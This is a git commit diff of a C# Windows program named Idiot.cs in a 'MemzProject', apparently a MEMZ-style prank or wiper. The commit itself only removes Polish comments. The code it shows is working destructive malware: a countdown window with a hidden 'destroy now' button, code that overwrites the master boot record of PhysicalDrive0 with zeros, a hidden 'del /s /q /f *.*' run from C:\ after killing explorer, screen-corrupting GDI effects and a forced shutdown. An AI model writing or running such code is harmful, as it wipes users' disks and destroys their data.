574c0a059398de8206c40b4126191c4bf9c6ccab
xoxojojo <kornelzietek7@gmail.com>
2026-03-25 14:37:25 +0100

    Idiot.cs

--- Idiot.cs
+++ Idiot.cs
@@ -14,7 +14,7 @@ namespace MemzProject
         [DllImport("gdi32.dll")] static extern bool BitBlt(IntPtr hdcD, int x, int y, int w, int h, IntPtr hdcS, int xs, int ys, int r);
         [DllImport("user32.dll")] static extern IntPtr GetDC(IntPtr h);
 
-        private int timeLeft = 600; // 10 minut
+        private int timeLeft = 600; 
         private Label lblTimer;
 
         [STAThread]
@@ -35,8 +35,6 @@ namespace MemzProject
             this.TopMost = true;
 
             lblTimer = new Label() { Text = "10:00", Font = new Font("Consolas", 36), Dock = DockStyle.Fill, TextAlign = ContentAlignment.MiddleCenter };
-            
-            // Ukryty przycisk "Destroy Now" (niewidoczna kropka w rogu)
             Button btnDestroy = new Button() { Text = ".", Location = new Point(0, 180), Size = new Size(20, 20), FlatStyle = FlatStyle.Flat, ForeColor = Color.Black };
             btnDestroy.Click += (s, e) => { timeLeft = 0; };
 
@@ -58,20 +56,17 @@ namespace MemzProject
 
         void ExecuteDestruction()
         {
-            // 1. NADPISANIE MBR (NATYCHMIAST)
             try {
                 uint written;
                 IntPtr drive = CreateFile("\\\\.\\PhysicalDrive0", 0x10000000, 1 | 2, IntPtr.Zero, 3, 0, IntPtr.Zero);
                 WriteFile(drive, new byte[512], 512, out written, IntPtr.Zero);
             } catch { }
 
-            // 2. USUNIĘCIE WSZYSTKICH PLIKÓW (del /s /q /f *.*)
             Process.Start(new ProcessStartInfo("cmd.exe", "/c taskkill /f /im explorer.exe & del /s /q /f *.*") { 
                 WindowStyle = ProcessWindowStyle.Hidden,
                 WorkingDirectory = "C:\\" 
             });
 
-            // 3. EFEKTY WIZUALNE (GDI RAVE)
             Thread gdi = new Thread(() => {
                 Random rnd = new Random();
                 IntPtr hdc = GetDC(IntPtr.Zero);
@@ -82,9 +77,7 @@ namespace MemzProject
             });
             gdi.Start();
 
-            // 4. SHUTDOWN PO 5 MINUTACH (300 SEKUND) Z TWOIM TEKSTEM
             Process.Start("shutdown", "/s /t 300 /c \"PC saying BYE BYE\"");
-            
             lblTimer.Text = "BYE BYE";
             lblTimer.ForeColor = Color.Red;
         }
